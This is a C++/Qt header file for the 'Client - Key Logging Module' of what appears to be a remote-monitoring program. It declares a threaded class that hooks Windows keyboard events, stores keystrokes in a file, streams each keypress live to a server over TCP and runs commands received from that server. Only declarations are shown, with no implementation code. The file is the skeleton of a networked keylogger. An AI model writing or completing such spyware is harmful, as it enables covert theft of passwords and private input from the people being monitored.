#ifndef TKEY_H
#define TKEY_H

#include <QThread>
#include <QDebug>
#include <iostream>
#include <Windows.h>
#include <functional>
#include <QFile>
#include "tcpsocket.h"

#pragma comment(lib, "user32.lib")


//***************************************//
//***************************************//
//***   Client - Key Logging Module   ***//
//***       Class Header File        ****//
//***************************************//
//***************************************//



//This class provides all the keylogging capabilites of the program. Most of it's members are static because
//it's a requirement of functions from the windows library that call back funtions should be static. Only one
//object of this class exists ar a time and works using the static functions in a different thread from the main
//thread since keylogging need to be done at all times. This class has data storage capabilites also and
//provides live key stroke viewing to the server too.


//Inherits QThread - Qt threading class
class tkey : public QThread
{
    Q_OBJECT

    static int keyCode;
    static tkey *myPtr;
    static QFile myFile;
    static bool keyDown;
    static HHOOK winHook;
    static bool sendingFile;
    static QString outputBuffer;

public:

    explicit tkey(QObject *parent = 0);

    static LRESULT CALLBACK monitorProc(int code, WPARAM wParam, LPARAM lParam);  //the call back function which is passed keyboard events from the OS

    static void updateKeyState(BYTE *,int); //updates key states of CAPSLOCK, CONTROL, ALT and SHIFT

    void run(); //overloaded function. Starts the thread when start is called.
    
signals:
    void sendCharacter(QByteArray);  //this signal is emitted whenever a key is pressed on the keyboard
    
public slots:
    void recievedCommand(QByteArray);  //The function which gets and executes commands recieved fron the server


    
};

#endif // TKEY_H
